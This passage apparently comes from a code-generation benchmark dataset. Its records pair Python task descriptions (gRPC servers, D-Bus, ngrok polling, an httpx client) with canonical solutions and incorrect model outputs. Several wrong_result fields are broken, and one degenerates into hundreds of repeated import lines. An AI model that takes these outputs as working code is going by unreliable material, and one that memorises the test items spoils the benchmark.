grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        trial_id = request.trial_id\n        param_name = request.param_name\n        param_value_internal = request.param_value_internal\n        distribution = json_to_distribution(request.distribution)\n        try:\n            self._backend.set_trial_param(trial_id, param_name, param_value_internal, distribution)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        except RuntimeError as e:\n            context.abort(code=grpc.StatusCode.FAILED_PRECONDITION, details=str(e))\n        except ValueError as e:\n            context.abort(code=grpc.StatusCode.INVALID_ARGUMENT, details=str(e))\n        return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        trial_id = request.trial_id\n        try:\n            trial = self._backend.get_trial(trial_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetTrialReply(trial=_to_proto_trial(trial))\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        study_id = request.study_id\n        states = [_from_proto_trial_state(state) for state in request.states]\n        try:\n            trials = self._backend.get_all_trials(\n                study_id,\n                deepcopy=False,\n                states=states,\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetAllTrialsReply(trials=[_to_proto_trial(trial) for trial in trials])\n\n@experimental_func(\"4.2.0\")\ndef run_grpc_proxy_server(\n    storage: BaseStorage,\n    *,\n    host: str = \"localhost\",\n    port: int = 13000,\n    thread_pool: ThreadPoolExecutor | None = None,\n) -> None:\n    server = grpc.server(thread_pool or ThreadPoolExecutor(max_workers=10))\n    api_pb2_grpc.add_StorageServiceServicer_to_server(\n        OptunaStorageProxyService(storage), server\n    )\n    server.add_insecure_port(f\"{host}:{port}\")\n    server.start()\n    _logger.info(f\"Server started at {host}:{port}\")\n    _logger.info(\"Listening...\")\n    server.wait_for_termination()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom optuna import storage as optuna_storage\nfrom optuna.proto import api_pb2\nfrom optuna.proto import api_pb2_grpc\nimport threading\n\nclass OptunaStorageProxyService(api_pb2_grpc.StorageServiceServicer):\n    def __init__(self, backend: optuna_storage.BaseStorage):\n        self._backend = backend\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        with self._lock:\n            study_id = self._backend.create_new_study(directions=request.directions, study_name=request.study_name)\n            return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        with self._lock:\n            self._backend.delete_study(study_id=request.study_id)\n            return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        with self._lock:\n            self._backend.set_study_user_attribute(study_id=request.study_id, key=request.key, value=request.value)\n            return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        with self._lock:\n            study_id = self._backend.get_study_id_from_name(study_name=request.study_name)\n            return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        with self._lock:\n            study_name = self._backend.get_study_name_from_id(study_id=request.study_id)\n            return api_pb2.GetStudyNameFromIdReply(study_name=study_name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        with self._lock:\n            studies = self._backend.get_all_studies()\n            return api_pb2.GetAllStudiesReply(studies=studies)\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        with self._lock:\n            trial_id = self._backend.create_new_trial(study_id=request.study_id, trial_params=request.trial_params)\n            return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply:\n        with self._lock:\n            self._backend.set_trial_param(trial_id=request.trial_id, param_name=request.param_name, param_value=request.param_value)\n            return api_pb2.SetTrialParameterReply()\n\n    def GetTrial(self, request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply:\n        with self._lock:\n            trial = self._backend.get_trial(trial_id=request.trial_id)\n            return api_pb2.GetTrialReply(trial=trial)\n\n    def GetAllTrials(self, request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply:\n        with self._lock:\n            trials = self._backend.get_all_trials(study_id=request.study_id, trial_state=request.trial_state)\n            return api_pb2.GetAllTrialsReply(trials=trials)\n```"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Implement a gRPC server class that handles multiple protocols including health checks and service reflection, capable of serving JinaRPC requests asynchronously.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for JinaRPC services, health checks, and server reflection. It provides methods to start, run, and shutdown the server gracefully.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- host: str - The host address to bind the server to (default: '0.0.0.0')\n- health_servicer: HealthServicer - The health check service implementation\n- grpc_server: grpc.aio.Server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int, host: str = '0.0.0.0') -> None - Initializes the gateway with specified port and host\n- _setup_grpc_server() -> None - Sets up the gRPC server with JinaRPC services, health checks, and reflection (asynchronous)\n- run_server() -> None - Starts the server and waits for termination (asynchronous)\n- shutdown() -> None - Gracefully shuts down the server (asynchronous)",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        jina_pb2_grpc.add_JinaSingleDataRequestRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        \n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n            \n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{self.host}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom concurrent import futures\nfrom jina import __version__\nfrom jina.proto import jina_pb2_grpc\nfrom jina.proto.jina_pb2 import JinaRequest, JinaResponse\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.health import health_pb2_grpc\nfrom jina.proto.health import health_pb2\nfrom jina.proto.jina_pb2_grpc import JinaRPCServicer\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import JinaRPCStub\nfrom jina.proto.jina_pb2_grpc import add_JinaRPCServicer_to_server\nfrom jina.proto.jina_pb2_grpc import Jina"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Python function that interacts with the Pithos music player via D-Bus to retrieve and format the currently playing song's artist and title.\n\nFunction Description: The function connects to the user's D-Bus session bus, accesses the Pithos music player service, retrieves the current song information, and returns it in a formatted string combining the artist and title.\n\nInput: None\n\nOutput: str - A string in the format \"Artist - Title\" representing the currently playing song in Pithos, or None if the operation fails.",
    "Canonical_solution": "import dbus\n\ndef get_pithos_current_song():\n    pithos_bus = dbus.SessionBus()\n    pithos = pithos_bus.get_object(\"net.kevinmehall.Pithos\", \"/net/kevinmehall/Pithos\")\n    props = pithos.get_dbus_method(\"GetCurrentSong\", \"net.kevinmehall.Pithos\")\n    return props()[\"artist\"] + \" - \" + props()[\"title\"]",
    "Code_level": "Function-level",
    "FSMID_for_test": 75,
    "wrong_result": "```python\nimport dbus\n\ndef get_current_song():\n    try:\n        bus = dbus.SessionBus()\n        pithos = bus.get_object('org.gnome.Pithos', '/org/gnome/Pithos')\n        player = dbus.Interface(pithos, 'org.gnome.Pithos.Player')\n        song = player.get_current_song()\n        return f\"{song['artist']} - {song['title']}\"\n    except Exception:\n        return None\n```"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create an asynchronous function to check if the ngrok API is online and wait for it to become available if it's not.\n\nFunction Description: The function continuously attempts to connect to the ngrok API at a specified URL (constructed from environment variables) until it receives a successful response. It uses exponential backoff (fixed interval retries) between attempts and logs the connection status. The function is designed to be used in scenarios where you need to ensure the ngrok API is available before proceeding with operations that depend on it.\n\nInput: \n- None (uses environment variables NGROK_HOST and NGROK_PORT to construct the API URL)\n  \nOutput: \n- Returns True when the ngrok API is successfully reached\n- Does not return until a successful connection is established (infinite retry loop)",
    "Canonical_solution": "import asyncio\nimport httpx\nimport logging\n\nlogger = logging.getLogger(__name__)\n\nasync def wait_for_ngrok_api():\n    NGROK_API_URL = f\"http://{os.getenv('NGROK_HOST', 'ngrok')}:{os.getenv('NGROK_PORT', 4040)}\"\n    RETRY_INTERVAL = 15\n\n    while True:\n        try:\n            async with httpx.AsyncClient() as client:\n                response = await client.get(f\"{NGROK_API_URL}/api/tunnels\")\n                response.raise_for_status()\n                logger.debug(\"ngrok API is online.\")\n                return True\n        except httpx.RequestError:\n            logger.debug(\"ngrok API is offline. Waiting...\")\n            await asyncio.sleep(RETRY_INTERVAL)",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport asyncio\nimport logging\nimport os\nimport time\nimport urllib.request\n\nasync def wait_for_ngrok():\n    ngrok_host = os.getenv('NGROK_HOST')\n    ngrok_port = os.getenv('NGROK_PORT')\n    url = f'http://{ngrok_host}:{ngrok_port}/api/tunnels'\n    backoff_interval = 5  # seconds\n    max_retries = 10\n\n    for attempt in range(max_retries):\n        try:\n            with urllib.request.urlopen(url) as response:\n                if response.getcode() == 200:\n                    logging.info('ngrok API is online')\n                    return True\n        except Exception as e:\n            logging.warning(f'Failed to connect to ngrok API: {e}')\n\n        logging.info(f'Waiting for ngrok API... (Attempt {attempt + 1}/{max_retries})')\n        time.sleep(backoff_interval)\n\n    logging.error('Failed to connect to ngrok API after multiple attempts')\n    return False\n```"
  },
  {
    "Task_id": 56,
    "Instruction": "Task Description: Create a Python class that provides asynchronous HTTP client functionality using httpx and asyncio, supporting common HTTP methods (GET, POST), file downloads, and proxy configuration.\n\nClass Description: AsyncHttpx is a utility class for making asynchronous HTTP requests with features like automatic retry on multiple URLs, proxy support, and file downloads. It handles connection timeouts and HTTP errors gracefully.\n\nAttributes:\n- proxy: ClassVar[dict[str, Union[str, None]]] - A class-level dictionary storing proxy configurations for HTTP and HTTPS protocols\n\nMethods:\n- get(url: Union[str, list[str]], *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Performs an asynchronous GET request to one or multiple URLs, returning the first successful response\n- _get_first_successful(urls: list[str], **kwargs) -> Response - Internal method to attempt requests on multiple URLs until first success\n- _get_single(url: str, *, params: Optional[dict[str, Any]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Internal method to perform a single GET request\n- post(url: str, *, data: Optional[dict[str, Any]] = None, content: Any = None, files: Any = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, json: Optional[dict[str, Any]] = None, params: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> Response - Performs an asynchronous POST request with various payload options\n- download_file(url: Union[str, list[str]], path: Union[str, Path], *, params: Optional[dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[dict[str, str]] = None, headers: Optional[dict[str, str]] = None, cookies: Optional[dict[str, str]] = None, timeout: int = 30, **kwargs) -> bool - Downloads a file from a URL to the specified path, returning success status",
    "Canonical_solution": "import asyncio\nfrom asyncio.exceptions import TimeoutError\nimport httpx\nfrom httpx import ConnectTimeout, HTTPStatusError, Response\nfrom typing import Any, ClassVar, Optional, Union\nfrom pathlib import Path\nimport aiofiles\n\nclass AsyncHttpx:\n    proxy: ClassVar[dict[str, Union[str, None]]] = {\n        \"http://\": None,\n        \"https://\": None,\n    }\n\n    @classmethod\n    async def get(\n        cls,\n        url: Union[str, list[str]],\n        *,\n        params: Optional[dict[str, Any]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        urls = [url] if isinstance(url, str) else url\n        return await cls._get_first_successful(\n            urls,\n            params=params,\n            headers=headers,\n            cookies=cookies,\n            verify=verify,\n            use_proxy=use_proxy,\n            proxy=proxy,\n            timeout=timeout,\n            **kwargs,\n        )\n\n    @classmethod\n    async def _get_first_successful(\n        cls,\n        urls: list[str],\n        **kwargs,\n    ) -> Response:\n        last_exception = None\n        for url in urls:\n            try:\n                return await cls._get_single(url, **kwargs)\n            except Exception as e:\n                last_exception = e\n        raise last_exception or Exception(\"All URLs failed\")\n\n    @classmethod\n    async def _get_single(\n        cls,\n        url: str,\n        *,\n        params: Optional[dict[str, Any]] = None,\n        headers: Optional[dict[str, str]] = None,\n        cookies: Optional[dict[str, str]] = None,\n        verify: bool = True,\n        use_proxy: bool = True,\n        proxy: Optional[dict[str, str]] = None,\n        timeout: int = 30,\n        **kwargs,\n    ) -> Response:\n        _proxy = proxy or (cls.proxy if use_proxy else None)\n        async with httpx.AsyncClient(proxies=_proxy, verify=verify) as client:\n            return await client.get(\n                url,\n                params=params,\n                headers=headers,\n                cookies=cookies,\n                timeout=timeout,\n                **kwargs,\n            )\n\n    @classmethod\n    async def post(\n        cls,\n        url: str,\n        *,\n        data: Optional[dict[str, Any]] = None,\n        content: Any = None,\n     